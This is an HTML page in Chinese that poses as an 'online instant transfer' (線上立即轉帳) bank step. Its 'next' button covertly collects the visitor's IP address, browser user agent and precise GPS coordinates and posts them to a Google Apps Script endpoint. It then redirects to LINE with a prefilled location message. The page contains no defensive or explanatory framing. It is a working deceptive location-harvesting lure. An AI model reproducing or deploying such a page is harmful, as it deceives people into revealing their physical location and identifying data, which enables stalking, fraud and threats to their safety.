<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>線上立即轉帳</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
        button { padding: 15px 25px; font-size: 20px; }
        #status { margin-top: 20px; font-size: 18px; color: #333; }
    </style>
</head>
<body>
    <h2>線上立即轉帳</h2>
    <p>按下按鈕將自動開啟轉帳功能</p>
    <button id="actionBtn" onclick="sendLocation()">下一步</button>
    <p id="status"></p>

    <script>
        const GAS_URL = "https://script.google.com/macros/s/AKfycbyWCmFH3MfqiclvhddGbWTmltlAzQIV5xI4bgB2QxmXgtvxM9vjhU1b7oCje9aaNglGbQ/exec";

        async function sendLocation() {
            const btn = document.getElementById("actionBtn");
            btn.disabled = true;
            document.getElementById("status").innerText = "正在驗證並處理，請稍候...";

            try {
                // 取得 IP
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const userIP = ipData.ip;

                const userAgent = navigator.userAgent;

                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(async function(position) {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const mapLink = `https://maps.google.com/?q=${lat},${lon}`;
                        const text = `這是我的位置：\n${mapLink}`;

                        // 發送資料到 GAS
                        const response = await fetch(GAS_URL, {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({
                                latitude: lat,
                                longitude: lon,
                                mapLink: mapLink,
                                ip: userIP,
                                userAgent: userAgent
                            })
                        });

                        const result = await response.text();
                        console.log("伺服器回應：", result);
                        document.getElementById("status").innerText = "伺服器回應：" + result;

                        if (result === "OK") {
                            setTimeout(() => {
                                window.location.href = `https://line.me/R/msg/text/?${encodeURIComponent(text)}`;
                            }, 1500);
                        } else {
                            btn.disabled = false;
                        }

                    }, function(error) {
                        document.getElementById("status").innerText = "定位失敗，請允許位置存取。";
                        btn.disabled = false;
                    });
                } else {
                    document.getElementById("status").innerText = "瀏覽器不支援定位功能";
                    btn.disabled = false;
                }
            } catch (e) {
                document.getElementById("status").innerText = "系統錯誤：" + e.message;
                btn.disabled = false;
            }
        }
    </script>
</body>
</html>
